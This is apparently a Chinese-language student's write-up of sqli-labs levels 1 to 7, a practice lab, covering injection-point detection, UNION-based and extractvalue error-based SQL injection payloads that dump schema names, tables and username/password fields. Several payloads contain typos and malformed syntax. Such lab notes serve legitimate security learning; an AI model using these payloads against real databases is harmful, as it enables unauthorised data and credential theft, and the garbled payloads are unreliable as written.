Part one.

之前一直在忙那些大概的框架，不清楚的就一直挖，搞得一直钻牛角尖，正在学的基础有关的倒没怎么学到，也没怎么总结靶场，现在知道自己的无知有多么可怕，无语浪费了好多时间，现在也应该潜心下来一点点总结了。

如果你是使用的phpstudy，请务必将sql的版本调到5.5以上，因为这样你的数据库内才会有information_schema数据库，方便进行实验测试。
另外– （这里有一个空格，–空格）在SQL内表示注释，但在URL中，如果在最后加上– ，浏览器在发送请求的时候会把URL末尾的空格舍去，所以我们用–+代替– ，原因是+在URL被URL编码后会变成空格。

思路是这样的：

首先可以借助通过源码分析注入类型，然后在mysql里检查，然后对每一种不同类型进行分类，方法利用的也不一样，重点是多种方法的学习。

Part two.

1.sqli 1-4

第一关

讲一下联合查询：

联合查询，union 前后的两个注入语句都是执行成功的。而这里第一个执行的结果输出了，以致第二个sql查询结果无法显示出来。

那我们可以让第一个结果执行为空，第二个就可以显示出来了

注入点判断

1.在URL框里用get属于get型。经过语句and 1=2–+测试 ，页面回显正常，所以该地方不是数值查询

2.接着尝试在id后面加上’，发现页面回显不正常，表示可能存在SQL字符注入

3.输入–+将sql后面的语句注视掉后，发现页面回显正常，则证明这个地方是单引号字符型注入

查看列数

?id=1’ order by 1一直到4,页面回显不正常，说明此表一个有3列.

查看显示位

将id=1改为一个数据库不存在的id值,这里将1改成一个不存在的值-1，是因为想要回显出我们想要的数据，就让前面的sql语句查询结果为空。

爆破出数据库内的数据库名，表名，列名，字段信息

union查询要求所有查询中的列数必须相同，数据类型必须兼容。

数据库

当前

?id=-1’union select 1,database(),3

所有

?id=-1’ union select 1，（ group_concat(schema_name) from informaion_schema.schemata),3 –+

表名

?id=-1’ union select 1,2,t group_concat(table_name) from information_schema.tables where table_schema=database()–+

列名

?id=-1’ union select 1,2, group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’security’–+

字段名

?id=-1’ union select 1,2,select group_concat(password,username) from security.users–+

第二关

注入点判断

1.输入?id=3-2页面信息发生变化，说明此处是数值型注入

2.order by 3 页面显示正常，order by 4页面显示不正常，所以该表有3列数据

3.接着就像第一关的步骤就可以了

第三关

注入点判断

1.向页面输入?id=2’ –+页面显示不正常

2.输入 ?id=2’) –+ 页面回显正常，说明此处是字符型注入,而且是以 (‘’)的方式闭合字符串的

3.接着就像第一关的步骤就可以了

第四关

注入点判断

1.当输入?id=3” –+时，页面显示不正常

2.当输入?id=3”) –+，回显正常，说明是双引号注入,而且是以 (“”)的方式闭合字符串的

3.接着就像第一关的步骤就可以了

2.sqli5-6

第五关

这里开始是新型的注入方式，无显示位。是盲注型来了，没脚本好烦。

（1）报错注入，（2）延时盲注，（3）sqlmap以后再补充。

注入点判断

1.只会显示个 You are in…… 或者语法错误，输入 id=1 显示 You are in…… 输入 id = 2334 无回显，说明没有回显位，无法使用联合查询。前两者可以用报错注入，一和三界面可以用延时。

2.判断是单引号注入后

3，（1）在不知道报错可以有回显数据时，我瞎猜了数据库长度发现居然报错会回显有关信息。然后就去找有关函数来进行报错注入。

extractvalue（1，group_concat(0x7E,(……))）报错：

语法：extractvalue(目标xml文档，xml路径):对XML文档进行查询的函数

第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。

正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错

extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substr()函数截取，一次查看32位.

select username from security.user where id=1 and (extractvalue(‘anything’,’/x/xx’))

这里在’anything’中查询不到 位置是 /database()的内容，

但也没有语法错误，不会报错，下面故意写入语法错误：

select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘~’,(select database()))))

concat()查询结果合并但保持原有行数

?id=-1’ and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where%20 table_schema = database()))) –+

爆库，列，字段只要修改一下即可。

第六关

注入点判断

1.使用的是 “”的方式闭合字符串

2.我们只需要将?id=2’ 改为 ?id=2”即可

3.其余过程和第五关一样

3.sqli-labs7-8

第七关

注入点判断

1.先是id=1，然后id=1’。会发现双引号没有出现报错。这意味着存在单引号与其他的符号。因为输入的如果单引号包围id的话，双引号会作为一个字符，所以不报错。但是当我–+以后，后面多余的字符都作为了注释，却还报错。说明包围id的除了单引号还有其他符号，大概率就是括号。

select * from tables where id = ((’$id’))。
